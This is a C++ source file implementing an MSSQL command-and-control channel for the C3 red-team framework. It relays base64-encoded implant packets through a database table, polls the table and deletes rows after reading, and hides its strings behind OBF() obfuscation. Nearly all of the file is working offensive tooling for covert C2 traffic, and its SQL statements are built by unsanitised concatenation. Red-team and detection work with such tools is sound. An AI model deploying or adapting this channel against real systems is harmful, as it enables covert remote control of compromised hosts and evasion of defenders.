#include "Stdafx.h"
#include "MSSQL.h"
#include <sqlext.h>
#include <sqltypes.h>
#include <sql.h>
#include "Common/FSecure/Crypto/Base64.h"

#define DATA_LEN 1024

FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto[servername, databasename, tablename, username, password] = arguments.Read<std::string, std::string, std::string, std::string, std::string>();
	this->servername = servername;
	this->databasename = databasename;
	this->tablename = tablename;
	this->username = username;
	this->password = password;
	
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	std::string stmtString = OBF("Select * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '") + tablename + OBF("';");
	SQLRETURN retCode = SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS);
	
	if (retCode != SQL_SUCCESS && retCode != SQL_SUCCESS_WITH_INFO)
	{
		throw std::runtime_error(OBF("[x] Unable to get DB schema"));
	}

	//if there are no rows then the table doesn't exist
	if (SQLFetch(hStmt) != SQL_SUCCESS)
	{
														
		stmtString = OBF("CREATE TABLE dbo.") + this->tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSG varchar(max));");
		std::cout << stmtString << std::endl;
		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

		retCode = SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS);
		if (retCode != SQL_SUCCESS && retCode != SQL_SUCCESS_WITH_INFO)
		{
			throw std::runtime_error(OBF("[x] Unable to create table"));
		}
	}
	
	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLDisconnect(hConn);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);

}

size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteView packet)
{
	//connect to the database
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	std::string b64packet = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
	std::string stmtString = OBF("INSERT into dbo.") + this->tablename + OBF(" (MSG) VALUES ('") + this->m_outboundDirectionName + b64packet + OBF("');");

	if (SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS) != SQL_SUCCESS)
		throw std::exception(OBF("[x] Could not insert data\n"));

	
	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLDisconnect(hConn);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);
	return packet.size();
}

std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnReceiveFromChannel()
{
	//connect to the database
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	std::string stmt = OBF("SELECT TOP 1 * FROM dbo.") + this->tablename + OBF(" WHERE MSG like '") + this->m_inboundDirectionName + OBF("%';");
	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);

	std::vector<ByteVector> messages;

	SQLCHAR ret[DATA_LEN];
	SQLLEN len;
	std::string output;
	
	std::vector<json> data;
	std::string id;

	while (SQLFetch(hStmt) == SQL_SUCCESS) 
	{
		//get the ID
		SQLGetData(hStmt, 1, SQL_CHAR, ret, DATA_LEN, &len);
		id = (char*)ret;
		json j;
		j[OBF("id")] = id;

		SQLGetData(hStmt, 2, SQL_CHAR, ret, DATA_LEN, &len);
		
		output += (char*)ret;

		if (len > DATA_LEN)
		{
			//loop until there is no data left
			while (len > DATA_LEN)
			{
				SQLGetData(hStmt, 2, SQL_CHAR, ret, DATA_LEN, &len);
				output += (char*)ret;
			}

		}
		//this is pretty gross
		j[OBF("msg")] = output.substr(this->m_inboundDirectionName.size(), output.size());
		data.push_back(j);
	}
	

	for (auto& msg : data)
	{
		//delete the row in the DB - must realloc the stmt handle
		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
		stmt = OBF("DELETE FROM dbo.") + this->tablename + OBF(" WHERE ID = '") + msg[OBF("id")].get<std::string>() + OBF("';");
		SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
		
		//add the message to the messages vector
		auto m = cppcodec::base64_rfc4648::decode(msg[OBF("msg")].get<std::string>());
		messages.emplace_back(std::move(m));
	}

	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLDisconnect(hConn);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);
	return messages;
}

SQLRETURN FSecure::C3::Interfaces::Channels::MSSQL::Connect(SQLHANDLE* hConn, SQLHANDLE* hEvt)
{
	SQLCHAR ret[DATA_LEN];
	SQLHANDLE lhConn = NULL, lhStmt = NULL, lhEvt = NULL;

	if (SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &lhEvt) != SQL_SUCCESS)
		throw std::exception(OBF("[x] Error allocating handle"));
	if (SQLSetEnvAttr(lhEvt, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0) != SQL_SUCCESS)
		throw std::exception(OBF("[x] Error allocating handle"));
	if (SQLAllocHandle(SQL_HANDLE_DBC, lhEvt, &lhConn) != SQL_SUCCESS)
		throw std::exception(OBF("[x] Error allocating handle"));

	if(this->username.find("\\") != std::string::npos)
		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";Integrated Security=SSPI;UID=") + this->username + OBF(";PWD=") + this->password;
	else
		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";UID=") + this->username + OBF(";PWD=") + this->password;

	SQLRETURN retCode = SQLDriverConnectA(lhConn, NULL, (SQLCHAR*)connString.c_str(), SQL_NTS, ret, DATA_LEN, NULL, SQL_DRIVER_NOPROMPT);

	//Pointer dereferencing is done here to make the code easier to read
	*hConn = lhConn;
	*hEvt = lhEvt;

	return retCode;

}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::OnRunCommand(ByteView command)
{

	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
	case 0:
		return ClearTable();
	default:
		return {};
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::ClearTable()
{
	//connect to the database
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	std::string stmt = OBF("DELETE FROM dbo.") + this->tablename + ";";
	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
	return {};


}

const char* FSecure::C3::Interfaces::Channels::MSSQL::GetCapability()
{
	return R"_(
            {
                "create": {
		            "arguments":
		            [
			            [
				            {
					            "type": "string",
					            "name": "Input ID",
					            "min": 4,
					            "randomize": true,
					            "description": "Used to distinguish packets for the channel"
				            },
				            {
					            "type": "string",
					            "name": "Output ID",
					            "min": 4,
					            "randomize": true,
					            "description": "Used to distinguish packets from the channel"
				            }
			            ],
			            {
				            "type": "string",
				            "name": "Server Name",
				            "description": "The Host of the target database"
			            },
			            {
				            "type": "string",
				            "name": "Database Name",
				            "description": "The name of the database to write to"
			            },
			            {
				            "type": "string",
				            "name": "Table Name",
				            "description": "The name of the table to write to"
			            },
			            {
				            "type": "string",
				            "name": "Username",
				            "description": "The username used to authenticate to the database. If using a domain user put in the format DOMAIN\\Username"
			            },
			            {
				            "type": "string",
				            "name": "Password",
				            "description": "The password used to authenticate to the database"
			            }
		            ]
                },
               "commands":
	[
		{
			"name": "Clear DB Table",
			"id": 0,
			"description": "Deletes all rows in the database",
			"arguments": []
		}
	]
}
)_";
 
}

